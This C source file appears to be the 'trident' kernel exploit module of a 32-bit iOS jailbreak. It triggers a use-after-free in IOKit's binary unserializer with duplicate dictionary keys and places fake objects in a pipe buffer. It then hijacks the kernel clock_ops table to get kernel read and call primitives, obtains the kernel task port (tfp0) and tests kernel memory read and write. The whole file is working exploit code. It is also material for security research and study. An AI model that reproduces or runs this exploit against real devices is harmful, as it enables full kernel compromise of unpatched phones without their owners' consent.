// benjamin-42's trident

#include <mach/mach.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>

#include <io.h>
#include <plog.h>
#include <common.h>
#include <offsets.h>
#include <uaf.h>
#include <sockpuppet.h>

#define kOSSerializeBinarySignature "\323\0\0"

#define WRITE_IN(buf, data)         do { *(uint32_t *)(buf + bufpos) = (data); bufpos += 4; } while(0)

#define KERN_POINTER_VALID(val)     ((val) >= 0x80000000 && (val) != 0xffffffff)
#define PEXPLOIT_TO_UAF_PAYLOAD     (8)
#define UAF_PAYLOAD_OFFSET          (0x20)

extern kern_return_t io_service_open_extended(mach_port_t service, task_t owningTask, uint32_t connect_type, NDR_record_t ndr, io_buf_ptr_t properties, mach_msg_type_number_t propertiesCnt, kern_return_t *result, mach_port_t *connection);
extern kern_return_t io_service_get_matching_services_bin(mach_port_t master_port, io_struct_inband_t matching, mach_msg_type_number_t matchingCnt, mach_port_t *existing);
extern kern_return_t clock_get_attributes(clock_serv_t clock_serv, clock_flavor_t flavor, clock_attr_t clock_attr, mach_msg_type_number_t *clock_attrCnt);

extern kern_return_t mach_vm_allocate(vm_map_t target, mach_vm_address_t *address, mach_vm_size_t size, int flags);
extern kern_return_t mach_vm_deallocate(vm_map_t target, mach_vm_address_t address, mach_vm_size_t size);
extern kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize);
extern kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_offset_t data, mach_msg_type_number_t dataCnt);


static const char *lockfile = "/tmp/.trident_lock";
static int fildes[2];
static clock_serv_t clk_battery;
static clock_serv_t clk_realtime;
static uint32_t pipebuf = 0;
static uint32_t cpipe = 0;
static unsigned char pExploit[128];

static vm_offset_t vm_kernel_addrperm = 0;

static uint32_t current_task_func = 0;
static uint32_t ipc_port_make_send_func = 0;
static uint32_t ipc_port_copyout_send_func = 0;

static mach_port_t tfp0 = 0;

static unsigned char clock_ops_backup[] = {
    0x00, 0x00, 0x00, 0x00, // [00] rtclock.getattr
    0x00, 0x00, 0x00, 0x00, // [04] calend_config
    0x00, 0x00, 0x00, 0x00, // [08] calend_init
    0x00, 0x00, 0x00, 0x00, // [0C] calend_gettime
    0x00, 0x00, 0x00, 0x00, // [10] calend_getattr
};


static unsigned char clock_ops_overwrite[] = {
    0x00, 0x00, 0x00, 0x00, // [00] (rtclock.getattr): address of OSSerializer::serialize (+1)
    0x00, 0x00, 0x00, 0x00, // [04] (calend_config)  : NULL
    0x00, 0x00, 0x00, 0x00, // [08] (calend_init)    : NULL
    0x00, 0x00, 0x00, 0x00, // [0C] (calend_gettime) : address of calend_gettime (+1)
    0x00, 0x00, 0x00, 0x00, // [10] (calend_getattr) : address of _bufattr_cpx (+1)
};

static unsigned char uaf_payload_buffer[] = {
    0x00, 0x00, 0x00, 0x00, // [00] ptr to clock_ops_overwrite buffer
    0x00, 0x00, 0x00, 0x00, // [04] address of clock_ops array in kern memory
    0x00, 0x00, 0x00, 0x00, // [08] address of _copyin
    0x00, 0x00, 0x00, 0x00, // [0C] NULL
    0x00, 0x00, 0x00, 0x00, // [10] address of OSSerializer::serialize (+1)
    0x00, 0x00, 0x00, 0x00, // [14] address of "BX LR" code fragment
    0x00, 0x00, 0x00, 0x00, // [18] NULL
    0x00, 0x00, 0x00, 0x00, // [1C] address of OSSymbol::getMetaClass (+1)
    0x00, 0x00, 0x00, 0x00, // [20] address of "BX LR" code fragment
    0x00, 0x00, 0x00, 0x00, // [24] address of "BX LR" code fragment
};

// TODO
typedef struct {
    uint32_t magic;             // [00] <- magic
    uint32_t pad1;              // [04] <- check address
    uint32_t pad2;              // [08]
    uint32_t pad3;              // [0C]
    uint32_t pad4;              // [10]
    uint32_t pad5;              // [14]
    uint32_t pad6;              // [18] <-
    uint32_t pad7;              // [1C]
    unsigned char buf[0x1000];  // [20] <- UaF payload start
} fake_t;

static void copyin(void* to, uint32_t from, size_t size)
{
    mach_vm_size_t outsize = size;
    size_t szt = size;
    if (size > 0x1000)
    {
        size = 0x1000;
    }
    size_t off = 0;
    while (1)
    {
        mach_vm_read_overwrite(tfp0, off+from, size, (mach_vm_offset_t)(off+to), &outsize);
        szt -= size;
        off += size;
        if (szt == 0)
        {
            break;
        }
        size = szt;
        if (size > 0x1000)
        {
            size = 0x1000;
        }
    }
}

static void copyout(uint32_t to, void* from, size_t size)
{
    mach_vm_write(tfp0, to, (vm_offset_t)from, (mach_msg_type_number_t)size);
}

static uint32_t kread8(uint32_t addr)
{
    uint8_t val = 0;
    copyin(&val, addr, 1);
    return val;
}

static uint32_t kwrite8(uint32_t addr, uint8_t val)
{
    copyout(addr, &val, 1);
    return val;
}

static uint32_t kread16(uint32_t addr)
{
    uint16_t val = 0;
    copyin(&val, addr, 2);
    return val;
}

static uint32_t kwrite16(uint32_t addr, uint16_t val)
{
    copyout(addr, &val, 2);
    return val;
}

static uint32_t kread32(uint32_t addr)
{
    uint32_t val = 0;
    copyin(&val, addr, 4);
    return val;
}

static uint32_t kwrite32(uint32_t addr, uint32_t val)
{
    copyout(addr, &val, 4);
    return val;
}

static kern_return_t exec_prim(uint32_t fct, uint32_t arg1, uint32_t arg2)
{
    int attr;
    unsigned int attrCnt;
    char data[64];
    kern_return_t err = KERN_SUCCESS;
    
    write(fildes[1], "AAAABBBB", 8);
    write(fildes[1], &arg1, 4);
    write(fildes[1], &arg2, 4);
    write(fildes[1], &fct, 4);
    err = clock_get_attributes(clk_realtime, pipebuf, &attr, &attrCnt);

    read(fildes[0], data, 64);
    
    return err;
}

static uint32_t kread32_prim(uint32_t addr)
{
    int attr;
    unsigned int attrCnt;
    
    return clock_get_attributes(clk_battery, addr, &attr, &attrCnt);
}

static uint32_t exec_current_task(void)
{
    return (uint32_t)exec_prim(current_task_func, 0, 0);
}

static uint32_t exec_ipc_port_make_send(uint32_t arg0)
{
    return (uint32_t)exec_prim(ipc_port_make_send_func, arg0, 0);
}

static task_t exec_ipc_port_copyout_send(uint32_t arg0, uint32_t arg1)
{
    return (task_t)exec_prim(ipc_port_copyout_send_func, arg0, arg1);
}

int trident_initialize(void)
{
    kern_return_t err = KERN_FAILURE;
    
    int fd = open(lockfile, O_CREAT | O_WRONLY, 0644);
    if(fd == -1)
    {
        return -1;
    }
    
    flock(fd, LOCK_EX);
    
    if(pipe(fildes) == -1)
    {
        return -1;
    }
    
    err = host_get_clock_service(mach_host_self(), CALENDAR_CLOCK, &clk_battery);
    if (err != KERN_SUCCESS)
    {
        ERR("host_get_clock_service: %d", err_get_code(err));
        return -1;
    }
    
    err = host_get_clock_service(mach_host_self(), REALTIME_CLOCK, &clk_realtime);
    if (err != KERN_SUCCESS)
    {
        ERR("host_get_clock_service: %d", err_get_code(err));
        return -1;
    }
    
    return 0;
}

int trident(addr_t slide)
{
    kern_return_t retval = KERN_SUCCESS;
    
    mach_port_name_t ktask = MACH_PORT_NULL;
    struct stat buf;
    mach_port_t master = 0;
    mach_port_t res;
    char data[4096];
    uint32_t bufpos = 0;
    fake_t *fakebuf = NULL;
    
    uint32_t self_port_addr = 0;
    for (int i = 0; i < 5; i++)
    {
        self_port_addr = leakPortAddress(mach_task_self());
        if(self_port_addr != 0)
        {
            break;
        }
        usleep(10000);
    }
    
    if(self_port_addr == 0)
    {
        ERR("failed to get port address");
        goto fail;
    }
    LOG("self_port_addr: " ADDR, self_port_addr);
    
    int port_fds[2] = {-1, -1};
    kern_return_t err = pipe(port_fds);
    if (err)
    {
        ERR("failed to create pipe");
        goto fail;
    }
    
    size_t fakesize = 0x1000;
    fakebuf = malloc(fakesize);
    if(!fakebuf)
    {
        ERR("failed to allocate fakebuf");
        goto fail;
    }
    
    static int retryval = 0;
    
retry:
    bzero((void *)fakebuf, fakesize);
    
    *(uint32_t *)(clock_ops_overwrite + 0x00) = slide + koffset(off_OSSerializer_serialize);
    *(uint32_t *)(clock_ops_overwrite + 0x04) = 0;
    *(uint32_t *)(clock_ops_overwrite + 0x08) = 0;
    *(uint32_t *)(clock_ops_overwrite + 0x0C) = slide + koffset(off_calend_gettime);
    *(uint32_t *)(clock_ops_overwrite + 0x10) = slide + koffset(off_bufattr_cpx);
    
    *(uint32_t *)(uaf_payload_buffer + 0x00) = (uint32_t)clock_ops_overwrite;               // =r0
    *(uint32_t *)(uaf_payload_buffer + 0x04) = slide + koffset(off_clock_ops);              // =r1
    *(uint32_t *)(uaf_payload_buffer + 0x08) = slide + koffset(off_copyin);                 // =copyin(r0, r1, 0x14) // r2=0x14
    *(uint32_t *)(uaf_payload_buffer + 0x0C) = 0;
    *(uint32_t *)(uaf_payload_buffer + 0x10) = slide + koffset(off_OSSerializer_serialize);
    *(uint32_t *)(uaf_payload_buffer + 0x14) = slide + koffset(off_bx_lr);
    *(uint32_t *)(uaf_payload_buffer + 0x18) = 0;
    *(uint32_t *)(uaf_payload_buffer + 0x1C) = slide + koffset(off_OSSymbol_getMetaClass);
    *(uint32_t *)(uaf_payload_buffer + 0x20) = slide + koffset(off_bx_lr);
    *(uint32_t *)(uaf_payload_buffer + 0x24) = slide + koffset(off_bx_lr);
    
    fakebuf->magic = 0x41424344;    // 0x00
    fakebuf->pad1  = 0x41414141;    // 0x04
    fakebuf->pad2  = 0;             // 0x08
    fakebuf->pad3  = 0;             // 0x0c
    fakebuf->pad4  = 0;             // 0x10
    fakebuf->pad5  = 0;             // 0x14
    fakebuf->pad6  = 0;             // 0x18
    fakebuf->pad7  = 0;             // 0x1c
    
    memcpy((void *)fakebuf + UAF_PAYLOAD_OFFSET, uaf_payload_buffer, sizeof(uaf_payload_buffer));
    memcpy((void *)fakebuf + UAF_PAYLOAD_OFFSET + sizeof(uaf_payload_buffer), clock_ops_overwrite, sizeof(clock_ops_overwrite));
    
    write(port_fds[1], (void *)fakebuf, fakesize);
    read(port_fds[0], (void *)fakebuf, fakesize);
    
#define kread32_uaf(off) \
({ \
uint32_t val = 0; \
val = kread32_via_uaf(off); \
if(!val || !KERN_POINTER_VALID(val)) \
{ \
usleep(10000); \
val = kread32_via_uaf(off); \
if(!val || !KERN_POINTER_VALID(val)) \
{ \
retryval++; \
if(retryval > 5) \
goto fail; \
ERR("retry...: %d", retryval); \
goto retry; \
} \
} \
val; \
}) \

    *(uint32_t *)(clock_ops_backup + 0x00) = kread32_uaf(slide + koffset(off_clock_ops) + 0x00);
    *(uint32_t *)(clock_ops_backup + 0x04) = 0;
    *(uint32_t *)(clock_ops_backup + 0x08) = 0;
    *(uint32_t *)(clock_ops_backup + 0x0C) = slide + koffset(off_calend_gettime);
    *(uint32_t *)(clock_ops_backup + 0x10) = kread32_uaf(slide + koffset(off_clock_ops) + 0x10);
    
    uint32_t self_task_addr = kread32_uaf(self_port_addr + koffset(off_ipc_port_ip_kobject));
    LOG("self_task_addr: " ADDR, self_task_addr);
    
    uint32_t proc_addr = kread32_uaf(self_task_addr + koffset(off_task_bsd_info));
    LOG("proc_addr: " ADDR, proc_addr);
    
    uint32_t p_fd = kread32_uaf(proc_addr + koffset(off_p_fd));
    LOG("p_fd: " ADDR, p_fd);
    
    uint32_t fd_ofiles = kread32_uaf(p_fd + koffset(off_filedesc_fd_ofiles));
    LOG("fd_ofiles: " ADDR, fd_ofiles);
    
    uint32_t fproc = kread32_uaf(fd_ofiles + port_fds[0] * sizeof(uint32_t));
    LOG("fproc: " ADDR, fproc);
    
    uint32_t f_fglob = kread32_uaf(fproc + koffset(off_fileproc_f_fglob));
    LOG("f_fglob: " ADDR, f_fglob);
    
    uint32_t fg_data = kread32_uaf(f_fglob + koffset(off_fileglob_fg_data));
    LOG("fg_data: " ADDR, fg_data);
    
    uint32_t pipe_buffer = kread32_uaf(fg_data + koffset(off_pipe_buffer));
    LOG("pipe_buffer: " ADDR, pipe_buffer);
    
    uint32_t checkval = kread32_via_uaf(pipe_buffer + 4);
    if(checkval != 0x41414141)
    {
        retryval++;
        if(retryval > 5)
            goto fail;
        ERR("retry...: %d", retryval);
        goto retry;
    }
    
    memcpy(data, kOSSerializeBinarySignature, sizeof(kOSSerializeBinarySignature));
    bufpos += sizeof(kOSSerializeBinarySignature);
    
    WRITE_IN(data, kOSSerializeDictionary | kOSSerializeEndCollection | 0x10);
    // pre-9.1 doesn't accept strings as keys, but duplicate keys :D
    WRITE_IN(data, kOSSerializeSymbol     | 4);
    WRITE_IN(data, 0x00327973);                 // "sy2"
    // our key is a OSString object that will be freed
    WRITE_IN(data, kOSSerializeString     | 4);
    WRITE_IN(data, 0x00327973);                 // irrelevant
    
    // now this will free the string above
    WRITE_IN(data, kOSSerializeObject     | 1);     // ref to "sy2"
    WRITE_IN(data, kOSSerializeBoolean    | 1);    // lightweight value
    
    // and this is the key for the value below
    WRITE_IN(data, kOSSerializeObject     | 1);     // ref to "sy2" again
    
    WRITE_IN(data, kOSSerializeData       | 0x14);
    WRITE_IN(data, pipe_buffer + UAF_PAYLOAD_OFFSET);               // [00] address of uaf_payload_buffer
    WRITE_IN(data, 0x41414141);                                     // [04] dummy
    WRITE_IN(data, pipe_buffer + UAF_PAYLOAD_OFFSET - 0x8);         // [08] address of uaf_payload_buffer - 8
    WRITE_IN(data, 0x00000014);                                     // [0C] static value of 20
    WRITE_IN(data, koffset(off_OSSerializer_serialize) + slide);    // [10] address of OSSerializer::serialize (+1)
    
    // now create a reference to object 1 which is the OSString object that was just freed
    WRITE_IN(data, kOSSerializeObject | kOSSerializeEndCollection | 2);
    
    /* get a master port for IOKit API */
    host_get_io_master(mach_host_self(), &master);
    
    /* trigger the bug */
    err = io_service_get_matching_services_bin(master, data, bufpos, &res);
    LOG("io_service_get_matching_services_bin: %s", mach_error_string(err));
    
    
    uint32_t readtest = 0;
    
    /* test read primitive */
    LOG("testing read primitive");
    readtest = kread32_prim(0x80001000 + slide);
    LOG("read primitive: %s", readtest == MACH_MAGIC ? "success" : "failure");
    if(readtest != MACH_MAGIC)
    {
        ERR("kread failed " ADDR " != " ADDR, readtest, MACH_MAGIC);
        goto fail;
    }
    
    vm_kernel_addrperm = kread32_prim(koffset(off_vm_kernel_addrperm) + slide);
    
    /* pipe test */
    LOG("testing pipe");
    if(fstat(fildes[0], &buf) == -1)
    {
        ERR("pipe test failed");
        goto fail;
    }
    cpipe = (uint32_t)(buf.st_ino - vm_kernel_addrperm);
    write(fildes[1], "ABCDEFGH", 8);
    readtest = kread32_prim(cpipe);
    if(readtest != 8)
    {
        ERR("pipe test failed " ADDR " != " ADDR, readtest, 8);
        goto fail;
    }
    pipebuf = kread32_prim(cpipe + 16);
    readtest = kread32_prim(pipebuf);
    if(readtest != 0x44434241)
    {
        ERR("pipe test failed " ADDR " != " ADDR, readtest, 0x44434241);
        goto fail;
    }
    readtest = kread32_prim(pipebuf + 4);
    if(readtest != 0x48474645)
    {
        ERR("pipe test failed " ADDR " != " ADDR, readtest, 0x48474645);
        goto fail;
    }
    
    read(fildes[0], data, 4096);
    
    
    // set exec prim
    LOG("setting exec primitive");
    current_task_func           = slide + koffset(off_current_task);
    ipc_port_make_send_func     = slide + koffset(off_ipc_port_make_send);
    ipc_port_copyout_send_func  = slide + koffset(off_ipc_port_copyout_send);
    
    
    // tfp0
    // ref: siguza's cl0ver https://blog.siguza.net/cl0ver/
    // *task_addr = ipc_port_copyout_send(ipc_port_make_send(kernel_task->itk_self), current_task()->itk_space);
    LOG("trying tfp0");
    
    uint32_t current_task = exec_current_task();
    LOG("current_task(): " ADDR, current_task);
    
    uint32_t current_task_itk_space = kread32_prim(current_task + koffset(off_task_itk_space));
    LOG("current_task()->itk_space: " ADDR, current_task_itk_space);
    
    uint32_t kernel_task = kread32_prim(koffset(off_kernel_task) + slide);
    LOG("kernel_task: " ADDR, kernel_task);
    
    uint32_t kernel_task_itk_self = kread32_prim(kernel_task + koffset(off_task_itk_self));
    LOG("kernel_task->itk_self: " ADDR, kernel_task_itk_self);
        
    uint32_t sright = exec_ipc_port_make_send(kernel_task_itk_self);
    LOG("sright: " ADDR, sright);
    
    ktask = exec_ipc_port_copyout_send(sright, current_task_itk_space);
    
    tfp0 = ktask;
    LOG("got tfp0: " ADDR, tfp0);
    
    LOG("checking tfp0");
    mach_vm_address_t page = 0;
    retval = mach_vm_allocate(tfp0, &page, 0x1000, VM_FLAGS_ANYWHERE);
    LOG("mach_vm_allocate: 0x%llx, %s", page, mach_error_string(retval));
    if(retval != KERN_SUCCESS || page == 0)
    {
        ERR("mach_vm_allocate failed");
        goto fail;
    }
    
    uint32_t testdata[] = { 0x41414141, 0x12345678 };
    retval = mach_vm_write(tfp0, page, (vm_offset_t)testdata, sizeof(testdata));
    LOG("mach_vm_write: %s", mach_error_string(retval));
    if(retval != KERN_SUCCESS)
    {
        ERR("mach_vm_write failed");
        goto fail;
    }
    
    uint32_t check[2] = {};
    mach_vm_size_t size = sizeof(check);
    retval = mach_vm_read_overwrite(tfp0, page, sizeof(check), (mach_vm_address_t)check, &size);
    LOG("mach_vm_read_overwrite: %s", mach_error_string(retval));
    if(retval != KERN_SUCCESS)
    {
        ERR("mach_vm_read_overwrite failed");
        goto fail;
    }
    
    LOG("data: " ADDR " " ADDR, check[0], check[1]);
    if(check[0] != testdata[0] || check[1] != testdata[1])
    {
        ERR("data mismatch");
        goto fail;
    }
    
    retval = mach_vm_deallocate(tfp0, page, 0x1000);
    LOG("mach_vm_deallocate: %s", mach_error_string(retval));
    if(retval != KERN_SUCCESS)
    {
        ERR("mach_vm_deallocate failed");
        goto fail;
    }
    
    // cleanup
    LOG("cleanup");
    retval = mach_vm_write(tfp0, (slide + koffset(off_clock_ops)), (vm_offset_t)clock_ops_backup, 0x14);
    LOG("mach_vm_write: %s", mach_error_string(retval));
    if(retval != KERN_SUCCESS)
    {
        ERR("mach_vm_write failed");
        goto fail;
    }
    
    if (port_fds[0] > 0) close(port_fds[0]);
    if (port_fds[1] > 0) close(port_fds[1]);
    if(fakebuf) free((void *)fakebuf);
    
    return 0;
    
fail:
    ERR("trident failed");
    tfp0 = MACH_PORT_NULL;
    if (port_fds[0] > 0) close(port_fds[0]);
    if (port_fds[1] > 0) close(port_fds[1]);
    if(fakebuf) free((void *)fakebuf);
    return -1;
}
